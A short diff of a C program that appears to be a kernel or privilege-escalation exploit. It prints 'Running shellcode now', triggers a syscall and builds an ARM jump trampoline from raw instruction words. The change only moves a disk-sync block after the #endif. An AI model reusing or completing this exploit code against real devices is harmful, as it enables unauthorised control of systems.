@@ -1094,12 +1094,6 @@ int main(int argc, char *argv[])
     printf("Running shellcode now.\n");
     syscall(0);
 
-    printf("Syncing disks.\n");
-    int diskSync;
-    for (diskSync = 0; diskSync < 10; diskSync++)
-        sync();
-    sleep(1);
-
 #else
 
     static uint32_t arm[2] = { 0xe51ff004, 0x9fe00000 };
@@ -1113,6 +1107,12 @@ int main(int argc, char *argv[])
     printf("%x\n", *(uint32_t *) (0x7f000000 + 0x1000));
 
 #endif
+
+    printf("Syncing disks.\n");
+    int diskSync;
+    for (diskSync = 0; diskSync < 10; diskSync++)
+        sync();
+    sleep(1);
 
     while (1) {
         printf("Magic happening now. (attempted!)\n");
